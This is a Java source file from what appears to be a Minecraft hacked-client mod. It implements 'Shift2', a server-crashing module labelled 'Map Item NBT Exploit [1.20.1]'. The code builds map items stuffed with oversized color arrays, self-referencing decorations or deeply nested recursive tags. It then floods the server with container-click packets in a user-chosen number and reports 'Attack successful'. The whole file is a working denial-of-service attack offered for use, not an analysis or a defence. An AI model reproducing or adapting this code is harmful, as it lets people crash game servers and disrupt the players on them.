package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import org.jetbrains.annotations.NotNull;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;

import java.util.List;

    /*
    NOTE: Shift2 was created by Iniuriasu for XynisClient
    */

public class Shift2 implements Crasher {
    private static final String METHOD_NAME = "Shift2";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int mapSize = Integer.parseInt(args[3]);
        String mode = args[4].toLowerCase();

        setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        ItemStack mapStack = switch (mode) {
            case "color" -> createColorMap(mapSize);
            case "deco" -> createDecorationMap(mapSize);
            default -> createRecursiveMap(mapSize);
        };

        for (int i = 0; i < packets; i++) {
            PacketHelper.send(new ServerboundContainerClickPacket(
                    0, 0, 0, 0,
                    ClickType.QUICK_MOVE,
                    mapStack,
                    new Int2ObjectOpenHashMap<>()
            ));
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private @NotNull ItemStack createColorMap(int size) {
        ItemStack map = new ItemStack(Items.FILLED_MAP);
        CompoundTag tag = new CompoundTag();
        CompoundTag mapData = new CompoundTag();

        byte[] colors = new byte[Math.min(size, 2097152)];
        for (int i = 0; i < colors.length; i++) {
            colors[i] = (byte) (i % 256);
        }

        mapData.putByteArray("colors", colors);
        mapData.putInt("xCenter", Integer.MAX_VALUE);
        mapData.putInt("zCenter", Integer.MAX_VALUE);
        tag.put("map", mapData);
        map.setTag(tag);
        return map;
    }

    private @NotNull ItemStack createDecorationMap(int count) {
        ItemStack map = new ItemStack(Items.FILLED_MAP);
        CompoundTag tag = new CompoundTag();
        CompoundTag mapData = new CompoundTag();
        ListTag decorations = new ListTag();

        for (int i = 0; i < count; i++) {
            CompoundTag deco = new CompoundTag();
            deco.putString("id", "marker_" + i);
            deco.putString("type", "frame");
            deco.putDouble("x", Double.MAX_VALUE);
            deco.putDouble("z", Double.MAX_VALUE);
            deco.put("children", new ListTag() {{
                add(deco.copy());
            }});
            decorations.add(deco);
        }

        mapData.put("decorations", decorations);
        tag.put("map", mapData);
        map.setTag(tag);
        return map;
    }

    private @NotNull ItemStack createRecursiveMap(int depth) {
        ItemStack map = new ItemStack(Items.FILLED_MAP);
        CompoundTag current = map.getOrCreateTag();


        for (int i = 0; i < depth; i++) {
            CompoundTag newLevel = new CompoundTag();
            newLevel.put("nested", current.copy());
            current = newLevel;
        }

        map.getOrCreateTag().put("RecursiveData", current);
        return map;
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Mode", OptionType.LIST, new String[]{"color", "deco", "recursive"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[1000], size[1], mode[deco]";
    }

    @Override
    public String getDescription() {
        return "Map Item NBT Exploit [1.20.1]";
    }
}